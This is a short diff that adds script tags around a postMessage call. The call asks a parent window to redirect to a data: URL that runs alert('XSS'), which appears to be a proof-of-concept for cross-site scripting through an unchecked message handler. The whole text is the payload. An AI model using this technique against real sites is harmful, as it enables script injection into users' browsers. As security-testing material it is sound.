@@ -1,4 +1,6 @@
+<script>
 parent.postMessage({
     action: "requestRedirectionTo",
     targetUrlStr: "data:text/html,<script>alert('XSS')</script>"
 }, "*");
+</script>
